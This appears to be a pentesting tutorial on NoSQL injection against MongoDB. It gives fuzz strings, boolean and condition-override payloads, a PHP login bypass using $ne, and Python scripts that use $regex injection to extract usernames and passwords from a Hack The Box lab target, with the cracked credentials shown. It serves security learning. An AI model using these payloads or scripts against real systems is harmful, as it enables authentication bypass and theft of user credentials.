---
title: NoSQL Injection (NoSQLi)
category: Web
order: 4
---

NoSQL injection attacks can be especially dangerous because code

# Introduction

NoSQL injection vulnerabilities allow attackers to inject code into commands for databases that don’t use SQL queries, such as MongoDB. NoSQL injection attacks can be especially dangerous because code is injected and executed on the server in the language of the web application, potentially allowing arbitrary code execution.

## Types of NoSQLi

There are two different types of NoSQLi:

* **Syntax injection**: This occurs when you can break the NoSQL query syntax, enabling you to inject your own payload.
* **Operator injection**: This occurs when you can use NoSQL query operators to manipulate queries.


# NoSQL Syntax injection

We can potentially detect NoSQL injection vulnerabilities by attempting to break the query syntax. To do this we can systematicaally test each input by submitting fuzz strings and special characters that trigger a databaase error.

## Detecting syntax injection in MongoDB

To test whether the input may be vulnerable, submit a fuzz string.

Example of fuzzing:
```
'"`{\n;$Foo}\n$Foo \xYZ
'%22%60%7b%0d%0a%3b%24Foo%7d%0d%0a%24Foo%20%5cxYZ%00
'\"`{\r;$Foo}\n$Foo \\xYZ\u0000
```

### Determining which characters are processed

To determine which characters are interpreted as syntax by the application, you can inject indiviual characters.

Confirm the behaviour with `'` and a escaped `\'`. If we have different responses we may have a NoSQLi. 

```
this.category == '''
this.category == '\''
```

### Confirming conditional behaviour

After detecting the vulnerability, the next step is to determine whether you can influence boolena conditions using NoSQL syntax.

To test this, send two requests, one with a false condition and one with a true condition. Examples:

```
' && 0 && 'x
' && 1 && 'x
```

Example:

```
https://insecure-website.com/product/lookup?category=fizzy'+%26%26+0+%26%26+'x
https://insecure-website.com/product/lookup?category=fizzy'+%26%26+1+%26%26+'x
```

### Overriding existing conditions

We can override the existing condition to a TRUE in order to exploit the vulnerability and get more results.

```
'||'1'=='1
https://insecure-website.com/product/lookup?category=fizzy%27%7c%7c%27%31%27%3d%3d%27%31
this.category == 'fizzy'||'1'=='1'
```

### Break the sentence

We can also add a null character to break the original query.

```
test'%00
test'\u0000
```

# Simple MongoDB Injection

For a basic authentication bypass, the attacker can try to enter MongoDB operators in field values, for example `$eq` (equals), `$ne` (not equal to) or `$gt` (greater than). Here’s an unsafe way to build a database query in a PHP application, with the parameter values taken directly from a form:

```
$query = array("user" => $_POST["username"], "password" => 
    $_POST["password"]);
```

If this query is then used to check login credentials, the attacker can abuse PHP’s built-in associative array processing to inject a MongoDB query that always returns true and bypass the authentication process. This may be as simple as sending the following POST request:

```
username[$ne]=1&password[$ne]=1
```

PHP will translate this into an array of arrays:

```
array("username" => array("$ne" => 1), "password" => 
    array("$ne" => 1));
```

When sent as a MongoDB query to a user store, this will find all users where the user name and password are not equal to 1, which is highly likely to be true and may allow the attacker to bypass authentication.

# Login Bypass (PHP)

Injecting the `$ne` :

```
#Find some one where username not equals to "" and password not equals to ""
username[$ne]=&password[$ne]=&login=login
```

## Dumping Database (PHP)

First instead of `$ne` we are going to use `$regex` in order to discover character by character.

### Get all Usernames

First we are going to see al type of characters used in the usernames.

```
import sys, os, requests, codecs
import string

s = requests.Session()


for char in string.ascii_lowercase:

	regex = '{}.*'.format(char)
	data_post = {
		"username[$regex]" : regex,
		"password[$ne]" : "password",
		"login" : "login"
	}
	resp = s.post("http://staging-order.mango.htb/index.php", data=data_post, verify=False,  allow_redirects=False)
	if resp.status_code == 302:
		print("Valid letter: " + char)
```

> **Regex:** {}.\*

```
❯ python3 exploit.py
Valid letter: a
Valid letter: d
Valid letter: g
Valid letter: i
Valid letter: m
Valid letter: n
Valid letter: o
```

Secondly, we are going to check which one goes at firs position:

```
import sys, os, requests, codecs
import string

s = requests.Session()

valid_letters = ['a', 'd', 'g', 'i', 'm', 'n', 'o']

for char in valid_letters:

	regex = '^{}.*'.format(char)
	data_post = {
		"username[$regex]" : regex,
		"password[$ne]" : "password",
		"login" : "login"
	}
	resp = s.post("http://staging-order.mango.htb/index.php", data=data_post, verify=False,  allow_redirects=False)
	if resp.status_code == 302:
		print("Starts with: " + char)
```

> **Regex:** ^{}.\* ^ Indicates starts with

```
❯ python3 exploit.py
Starts with: a
Starts with: m
```

Finally we are going to loop until fails all characters used.

```
import sys, os, requests, codecs
import string

s = requests.Session()

def nextLetter(word):
	valid_letters = ['a', 'd', 'g', 'i', 'm', 'n', 'o']
	for char in valid_letters:

		regex = '^{}.*'.format(word+char)
		data_post = {
			"username[$regex]" : regex,
			"password[$ne]" : "password",
			"login" : "login"
		}
		resp = s.post("http://staging-order.mango.htb/index.php", data=data_post, verify=False,  allow_redirects=False)
		if resp.status_code == 302:
			return char
	return None

def getUser(start):

	name = start
	while True:
		l = nextLetter(name)
		if l is None:
			break;
		else:
			name += l
	return name

startsWith = ['a', 'm']
for char in startsWith:
	print('Username: ' + getUser(char))
```

```
❯ python3 enum_letters.py
Username: admin
Username: mango
```

### Get Passwords:

Same as users but remember to change the `$regex` of the user to `$ne` and the other way with password.

```
import sys, os, requests, codecs
import string

s = requests.Session()

def nextLetter(user, word):

	special_char = ['^','*', '$', '|', '.','\\' ,'+','?']
	for char in string.printable:
		if char in special_char:
			continue;
		regex = '^{}.*'.format(word+char)
		data_post = {
			"username" : user,
			"password[$regex]" : regex,
			"login" : "login"
		}
		resp = s.post("http://staging-order.mango.htb/index.php", data=data_post, verify=False,  allow_redirects=False)
		if resp.status_code == 302:
			return char
	return None

def getPass(user):

	passw = ""
	while True:
		l = nextLetter(user, passw)
		if l is None:
			break;
		else:
			passw += l
	return passw

users = ['admin', 'mango']
for user in users:
	print('Username: ' + user + ' Password: ' + getPass(user))
```

```
❯ python3 exploit.py
Username: admin Password: t9KcS3>!0B#2
Username: mango Password: h3mXK8RhU~f{]f5H
```

> **Remember:** Escape characters that could lead to problems with a regex.